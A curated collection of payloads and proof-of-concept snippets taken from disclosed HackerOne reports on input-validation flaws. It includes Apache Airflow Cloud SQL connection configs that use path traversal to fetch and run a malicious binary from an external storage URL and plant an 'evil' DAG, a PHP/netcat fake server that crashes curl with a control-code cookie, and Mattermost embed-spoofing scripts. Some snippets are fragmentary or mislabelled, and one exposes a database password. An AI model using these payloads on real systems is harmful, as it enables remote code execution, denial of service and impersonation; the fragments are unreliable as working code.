# Improper Input Validation  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#1165223](https://hackerone.com/reports/1165223)  -  Missing captcha and rate limit protection in help form
*medium*

```http
POST /handle-forms/help_submit_form.php HTTP/1.1
Host: mtn.cm
Content-Type: multipart/form-data; boundary=---------------------------425351903833406577801167297086
Content-Length: 743
Origin: https://mtn.cm
Referer: https://mtn.cm/help/
Cookie: qtrans_front_language=en; _fw_crm_v=0279789c-60ed-4e7d-9599-ae776a8b7ddb
```

## 2. [#1165223](https://hackerone.com/reports/1165223)  -  Missing captcha and rate limit protection in help form
*medium*

```http
POST /handle-forms/help_submit_form.php HTTP/1.1
Host: mtn.cm
Content-Type: multipart/form-data; boundary=---------------------------425351903833406577801167297086
Content-Length: 743
Origin: https://mtn.cm
Referer: https://mtn.cm/help/
Cookie: qtrans_front_language=en; _fw_crm_v=0279789c-60ed-4e7d-9599-ae776a8b7ddb

-----------------------------425351903833406577801167297086
Content-Disposition: form-data; name="mtn-name"

test
-----------------------------425351903833406577801167297086
Content-Disposition: form-data; name="mtn-contact-number"

test
-----------------------------425351903833406577801167297086
Content-Disposition: form-data; name="mtn-surname"

test
-----------------------------425351903833406577801167297086
Content-Disposition: form-data; name="mtn-email"

security@test.hackerone
-----------------------------425351903833406577801167297086
Content-Disposition: form-data; name="mtn-message"

hello please admin ignore this message it is security test
-----------------------------425351903833406577801167297086--
```

## 3. [#1895277](https://hackerone.com/reports/1895277)  -  Apache Airflow Google Cloud Sql Provider Remote Command Execution
*medium, $2,400*

```http
Put the compiled system malicious executable file into Google Cloud Storage, and set the permission to public. My address for this exploit is [https://storage.googleapis.com/swordlight/system](https://storage.googleapis.com/swordlight/system)

### 2.2 Creating a Malicious Google Cloud SQL Database Connection
```

## 4. [#1895277](https://hackerone.com/reports/1895277)  -  Apache Airflow Google Cloud Sql Provider Remote Command Execution
*medium, $2,400*

```http
Put it in the `/opt/airflow/dags` directory so that it can be automatically loaded by airflow.The content is as follows, where gcp_cloudsql_conn_id is set to the connection name aaa we established above.
```

## 5. [#2541027](https://hackerone.com/reports/2541027)  -  Posts sent via websockets aren't sanitized properly
*low, $150*

```javascript
const MM_INSTANCE_URL = process.env.MM_INSTANCE_URL;
const MM_AUTH_TOKEN = process.env.MM_AUTH_TOKEN;
const MM_USER_ID = process.env.MM_USER_ID;
const MM_CHANNEL_ID = process.env.MM_CHANNEL_ID; // the ID of the channel where we create the post

const TARGET_URL = "https://github.com/c0rydoras";

const metadata = {
  embeds: [
    {
      type: "opengraph",
      url: `${TARGET_URL}?ignore=https://youtube.com/watch?v=dQw4w9WgXcQ`,
      data: {
        type: "video.other",
        url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        title: "Rick Astley - Never Gonna Give You Up (Official Music Video)",
        description:
          "The official video for “Never Gonna Give You Up” by Rick Astley. The new album 'Are We There Yet?' is out now: Download here: https://RickAstley.lnk.to/AreWe...",
        determiner: "",
        site_name: "YouTube",
        locale: "",
        locales_alternate: null,
        images: [
          {
            url: "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg",
            secure_url: "",
            type: "",
            width: 1280,
            height: 720,
          },
        ],
        audios: null,
        videos: null,
      },
    },
# … truncated …
```

## 6. [#3175928](https://hackerone.com/reports/3175928)  -  ImageId Format Injection in Image Upload Endpoint
*medium*

```bash
curl -X POST "https://lichess.org/upload/image/user/test:evil:format:break" \
  -b "lila2=YOUR_SESSION_COOKIE" \
  -H "Origin: https://lichess.org" \
  -H "Referer: https://lichess.org/" \
  -F "image=@test.png"
```

## 7. [#1613943](https://hackerone.com/reports/1613943)  -  CVE-2022-35252: control code in cookie denial of service
*low*

```
php test.php | nc -nvlp 3333
```

## 8. [#1613943](https://hackerone.com/reports/1613943)  -  CVE-2022-35252: control code in cookie denial of service
*low*

```bash
curl -c cookies.txt http://127.0.0.1:3333
```

## 9. [#2541027](https://hackerone.com/reports/2541027)  -  Posts sent via websockets aren't sanitized properly
*low, $150*

```json
{"event":"posted","data":{"channel_display_name":"@arthurd","channel_name":"1wt8aoiskjg99dap81jx4zjejc__w1bycrx7apy3xn31j7dyszahfa","channel_type":"D","mentions":"[\"w1bycrx7apy3xn31j7dyszahfa\"]","post":"{\"id\":\"rpaioun83fds5ppf78bstpp3pw\",\"create_at\":1717764679114,\"update_at\":1717764679114,\"edit_at\":0,\"delete_at\":0,\"is_pinned\":false,\"user_id\":\"1wt8aoiskjg99dap81jx4zjejc\",\"channel_id\":\"ucatpix4girt5rp3w4xunng14o\",\"root_id\":\"\",\"original_id\":\"\",\"message\":\"\",\"type\":\"\",\"props\":{},\"hashtags\":\"\",\"pending_post_id\":\"\",\"reply_count\":0,\"last_reply_at\":0,\"participants\":null,\"metadata\":{\"embeds\":[{\"type\":\"opengraph\",\"url\":\"https://github.com/c0rydoras?ignore=https://youtube.com/watch?v=dQw4w9WgXcQ\",\"data\":{\"audios\":null,\"description\":\"The official video for “Never Gonna Give You Up” by Rick Astley. The new album 'Are We There Yet?' is out now: Download here: https://RickAstley.lnk.to/AreWe...\",\"determiner\":\"\",\"images\":[{\"height\":720,\"secure_url\":\"\",\"type\":\"\",\"url\":\"https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg\",\"width\":1280}],\"locale\":\"\",\"locales_alternate\":null,\"site_name\":\"YouTube\",\"title\":\"Rick Astley - Never Gonna Give You Up (Official Music Video)\",\"type\":\"video.other\",\"url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\",\"videos\":null}}]}}","sender_name":"@arthurd","set_online":true,"should_ack":true,"team_id":""},"broadcast":{"omit_users":null,"user_id":"","channel_id":"ucatpix4girt5rp3w4xunng14o","team_id":"","connection_id":"","omit_connection_id":""},"seq":4}
# … truncated …
```

## 10. [#3175928](https://hackerone.com/reports/3175928)  -  ImageId Format Injection in Image Upload Endpoint
*medium*

```
${ThreadLocalRandom.nextString(8)}
```

## 11. [#1895316](https://hackerone.com/reports/1895316)  -  CVE-2023-25692: Apache Airflow Google Provider: Google Cloud Sql Provider Denial Of Service and Remote Command Execution
*low, $480*

```
../../../opt/airflow/dags/load_my_evil_dag.py
```

## 12. [#1895316](https://hackerone.com/reports/1895316)  -  CVE-2023-25692: Apache Airflow Google Provider: Google Cloud Sql Provider Denial Of Service and Remote Command Execution
*low, $480*

```
../../../opt/airflow/dags/load_my_evil_dag.py`
```

## 13. [#2541027](https://hackerone.com/reports/2541027)  -  Posts sent via websockets aren't sanitized properly
*low, $150*

```
${MM_INSTANCE_URL}
```

## 14. [#2541027](https://hackerone.com/reports/2541027)  -  Posts sent via websockets aren't sanitized properly
*low, $150*

```
${MM_AUTH_TOKEN}
```

## 15. [#2541027](https://hackerone.com/reports/2541027)  -  Posts sent via websockets aren't sanitized properly
*low, $150*

```
${TARGET_URL}
```

## 16. [#1613943](https://hackerone.com/reports/1613943)  -  CVE-2022-35252: control code in cookie denial of service
*low*

```
* Trying 127.0.0.1:80...
* Connected to 127.0.0.1 (127.0.0.1) port 80 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1
> User-Agent: curl/7.83.1
> Accept: */*
> Cookie: a=b

> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 400 Bad Request
< Date: Tue, 21 Jun 2022 04:09:08 GMT
< Server: Apache/2.4.43 (Debian)
< Content-Length: 301
< Connection: close
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.43 (Debian) Server at 127.0.1.1 Port 80</address>
</body></html>
```

## 17. [#1895277](https://hackerone.com/reports/1895277)  -  Apache Airflow Google Cloud Sql Provider Remote Command Execution
*medium, $2,400*

```python
{
  "project_id":"pivotal-gearing-375804",
  "instance":"hellopg",
  "location":"us-central1-b",
  "database_type":"postgres",
  "use_proxy":"True",
  "use_ssl":"False",
  "sql_proxy_use_tcp":"True",
  "sql_proxy_version":"../swordlight/system?a=",
  "sslcert":"",
  "sslkey":"",
  "sslrootcert":""
}
```

## 18. [#3175928](https://hackerone.com/reports/3175928)  -  ImageId Format Injection in Image Upload Endpoint
*medium*

```bash
val image = PicfitImage(
  id = ImageId(s"$rel:${ThreadLocalRandom.nextString(8)}.$extension"),
  // rel parameter used directly without validation
  rel = rel,
  // ...
)
```

## 19. [#1895316](https://hackerone.com/reports/1895316)  -  CVE-2023-25692: Apache Airflow Google Provider: Google Cloud Sql Provider Denial Of Service and Remote Command Execution
*low, $480*

```python
{
  "project_id":"pivotal-gearing-375804",
  "instance":"hellopg",
  "location":"us-central1-b",
  "database_type":"postgres",
  "use_proxy":"True",
  "use_ssl":"False",
  "sql_proxy_use_tcp":"True",
  "sql_proxy_version":"../swordlight/load_my_evil_dag.py?a=",
  "sql_proxy_binary_path":"/../../../opt/airflow/dags/load_my_evil_dag.py",
  "sslcert":"",
  "sslkey":"",
  "sslrootcert":""
}
```

## 20. [#1613943](https://hackerone.com/reports/1613943)  -  CVE-2022-35252: control code in cookie denial of service
*low*

```
➜  ~ xxd cookies.txt
00000000: 2320 4e65 7473 6361 7065 2048 5454 5020  # Netscape HTTP 
00000010: 436f 6f6b 6965 2046 696c 650a 2320 6874  Cookie File.# ht
00000020: 7470 733a 2f2f 6375 726c 2e73 652f 646f  tps://curl.se/do
00000030: 6373 2f68 7474 702d 636f 6f6b 6965 732e  cs/http-cookies.
00000040: 6874 6d6c 0a23 2054 6869 7320 6669 6c65  html.# This file
00000050: 2077 6173 2067 656e 6572 6174 6564 2062   was generated b
00000060: 7920 6c69 6263 7572 6c21 2045 6469 7420  y libcurl! Edit 
00000070: 6174 2079 6f75 7220 6f77 6e20 7269 736b  at your own risk
00000080: 2e0a 0a31 3237 2e30 2e30 2e31 0946 414c  ...127.0.0.1.FAL
00000090: 5345 092f 0946 414c 5345 0930 0961 0962  SE./.FALSE.0.a.b
000000a0: 0c0a                                     ..
```

## 21. [#2541027](https://hackerone.com/reports/2541027)  -  Posts sent via websockets aren't sanitized properly
*low, $150*

```javascript
const MM_INSTANCE_URL = process.env.MM_INSTANCE_URL;
const MM_AUTH_TOKEN = process.env.MM_AUTH_TOKEN;
const MM_USER_ID = process.env.MM_USER_ID;
const MM_CHANNEL_ID = process.env.MM_CHANNEL_ID; // the ID of the channel where we create the post

const MM_TARGET_ID = "96nffx8oztncuyyxq7nj7p8seh"; // ID of a post, which the embed will target
const MM_SHOWN_USER_ID = "teur4prbifnh7dhq5rh3cp7q4c"; // the user shown in the embed, in this example its the userid of system

const metadata = ({
    embeds: [
      {
        type: "permalink",
        data: {
          post_id: MM_TARGET_ID,
          post: {
            id: MM_TARGET_ID,
            user_id: MM_SHOWN_USER_ID,
            channel_id: "doesnt-matter",
            root_id: "",
            original_id: "",
            message: 'This can be whatever i want',
            type: "",
            props: {},
            hashtags: "",
            reply_count: 0,
            last_reply_at: 0,
            participants: [],
            metadata: {},
          },
          team_name: "",
          channel_display_name: "can-be-anything-i-want",
          channel_type: "O",
          channel_id: "",
        },
      },
# … truncated …
```

## 22. [#1895277](https://hackerone.com/reports/1895277)  -  Apache Airflow Google Cloud Sql Provider Remote Command Execution
*medium, $2,400*

```http
postgres_kwargs = dict(
```

## 23. [#1165223](https://hackerone.com/reports/1165223)  -  Missing captcha and rate limit protection in help form
*medium*

```
HTTP/1.1 302 Found
Server: nginx
Date: Wed, 14 Apr 2021 19:33:51 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
X-Powered-By: PHP/7.3.27
location: /help/help-success
Content-Length: 0
```

## 24. [#1895316](https://hackerone.com/reports/1895316)  -  CVE-2023-25692: Apache Airflow Google Provider: Google Cloud Sql Provider Denial Of Service and Remote Command Execution
*low, $480*

```python
from __future__ import annotations

import pendulum

from airflow import DAG
from airflow.decorators import task
from airflow.operators.bash import BashOperator
with DAG(
    dag_id="load_my_evil_dag",
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
    catchup=False,
    schedule=None,
    tags=["example"],
) as dag:
    bash_task = BashOperator(
        task_id="bash_task",
        bash_command='mkdir /tmp/success'
    )
```

## 25. [#2541027](https://hackerone.com/reports/2541027)  -  Posts sent via websockets aren't sanitized properly
*low, $150*

```http
Posts aren't sanitized the same way when sent via Websockets as they are when saved to the database.
```

## 26. [#1613943](https://hackerone.com/reports/1613943)  -  CVE-2022-35252: control code in cookie denial of service
*low*

```
<?php
echo("HTTP/1.1 200 OK\r\nDate: Fri, 29 Apr 2022 10:11:55 GMT\r\nServer: Apache/2.4.43 (Debian)\r\nSet-Cookie: a=b\f; \r\nContent-Length: 0\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n");
```

## 27. [#1895277](https://hackerone.com/reports/1895277)  -  Apache Airflow Google Cloud Sql Provider Remote Command Execution
*medium, $2,400*

```python
from __future__ import annotations

import os
import subprocess
from datetime import datetime
from os.path import expanduser
from urllib.parse import quote_plus

from airflow import models
from airflow.providers.google.cloud.operators.cloud_sql import CloudSQLExecuteQueryOperator


SQL = [
    "CREATE TABLE IF NOT EXISTS TABLE_TEST (I INTEGER)",
    "CREATE TABLE IF NOT EXISTS TABLE_TEST (I INTEGER)",  # shows warnings logged
    "INSERT INTO TABLE_TEST VALUES (0)",
    "CREATE TABLE IF NOT EXISTS TABLE_TEST2 (I INTEGER)",
    "DROP TABLE TABLE_TEST",
    "DROP TABLE TABLE_TEST2",
]


postgres_kwargs = dict(
    user="postgres",
    password=r"ktd2(%EzQ5",
    public_port="5432",
    public_ip="34.122.52.6",
    project_id="pivotal-gearing-375804",
    location="us-central1-b",
    instance="hellopg",
    database="postgres",
    client_cert_file="key/postgres-client-cert.pem",
    client_key_file=".key/postgres-client-key.pem",
    server_ca_file=".key/postgres-server-ca.pem",
)


# Postgres: connect via proxy over TCP
os.environ["AIRFLOW_CONN_PROXY_POSTGRES_TCP"] = (
    "gcpcloudsql://{user}:{password}@{public_ip}:{public_port}/{database}?"
# … truncated …
```
